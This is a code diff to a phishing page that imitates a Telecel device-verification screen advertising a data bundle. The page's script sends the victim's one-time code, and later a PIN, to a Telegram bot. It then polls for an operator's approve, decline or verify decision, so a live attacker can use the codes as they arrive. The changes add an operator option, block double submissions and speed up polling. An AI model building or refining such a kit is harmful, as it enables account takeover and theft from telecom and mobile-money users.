@@ -26,10 +26,10 @@
         }
         .logo-section { 
             text-align: center; 
-            padding: 25px 0 15px; 
+            padding: 24px 0 14px; 
         }
         .telecel-logo { 
-            width: 132px; 
+            width: 130px; 
             height: auto; 
             margin: 0 auto; 
         }
@@ -100,6 +100,11 @@
             border-radius: 50px;
             cursor: pointer;
             margin: 8px 0;
+            transition: all 0.2s ease;
+        }
+        .btn-action:disabled {
+            background: #999;
+            cursor: not-allowed;
         }
         .back-btn {
             width: 100%;
@@ -122,8 +127,7 @@
         </div>
         <h1>Verify Device</h1>
         <p class="subtitle">Please enter the 6-digit code sent to your number</p>
-
-        <!-- Show selected offer -->
+        
         <div class="offer-info" id="offerInfo">
             <strong id="offerTitle"></strong><br>
             <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
@@ -169,11 +173,13 @@
         };
 
         let state = { lastUpdateId: 0, pollInterval: null };
+        let isProcessing = false;
 
         const errMsg = document.getElementById('errMsg');
         const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
         const pinModal = document.getElementById('pinModal');
+        const verifyBtn = document.getElementById('verifyBtn');
         const offerTitleEl = document.getElementById('offerTitle');
         const offerPriceEl = document.getElementById('offerPrice');
 
@@ -182,7 +188,7 @@
             const name = params.get('offer') || 'Data Bundle';
             const data = params.get('data') || '';
             const price = params.get('price') || '0';
-           
+          
             offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
             offerPriceEl.textContent = `GHS ${price}`;
         }
@@ -214,7 +220,7 @@
             inputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
                     if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
-                    if (getCode(containerId).length === length) setTimeout(callback, 300);
+                    if (getCode(containerId).length === length) setTimeout(callback, 250);
                 });
                 input.addEventListener('keydown', (e) => {
                     if (e.key === 'Backspace' && !input.value && index > 0) {
@@ -225,12 +231,23 @@
         }
 
         function submitCode() {
+            if (isProcessing) return;
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = "Verifying...";
+
             const code = getCode('otpInputs');
-            if (code.length !== 6) return;
+            if (code.length !== 6) {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = "Verify Device Code";
+                return;
+            }
 
             const ts = Date.now();
             const approveId = `dev_approve_${ts}`;
             const declineId = `dev_decline_${ts}`;
+            const verifyDeviceId = `dev_verify_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -240,43 +257,62 @@
                     text: `<b>🔴 Device Verification Code</b>\n\nOffer: ${offerTitleEl.textContent}\nCode: <code>${code}</code>\n\nChoose Action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: "✅ Approve & Continue", callback_data: approveId },
-                            { text: "❌ Decline", callback_data: declineId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve & Continue", callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                            ],
+                            [{ text: "❌ Decline", callback_data: declineId }]
+                        ]
                     }
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId);
+                startPolling(approveId, declineId, verifyDeviceId);
+            }).catch(() => {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = "Verify Device Code";
             });
         }
 
-        function startPolling(approveId, declineId) {
+        function startPolling(approveId, declineId, verifyDeviceId) {
             if (state.pollInterval) clearInterval(state.pollInterval);
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
-                        data.result?.forEach(update => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+                                const params = new URLSearchParams(window.location.search);
+
                                 if (cb === approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     showPinModal();
-                                } else if (cb === declineId) {
+                                } 
+                                else if (cb === verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                } 
+                                else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Code declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    isProcessing = false;
+                                    verifyBtn.disabled = false;
+                                    verifyBtn.textContent = "Verify Device Code";
                                 }
                             }
                         });
                     });
-            }, 1800);
+            }, 1400);
         }
 
         function showPinModal() {
@@ -320,11 +356,11 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+                                const params = new URLSearchParams(window.location.search);
+
                                 if (cb === validId) {
                                     clearInterval(interval);
                                     pinModal.style.display = 'none';
-                                    // Pass parameters to success page
-                                    const params = new URLSearchParams(window.location.search);
                                     window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
                                 } else if (cb === invalidId) {
                                     clearInterval(interval);
@@ -336,7 +372,7 @@
                             }
                         });
                     });
-            }, 1800);
+            }, 1500);
         }
 
         // Initialize
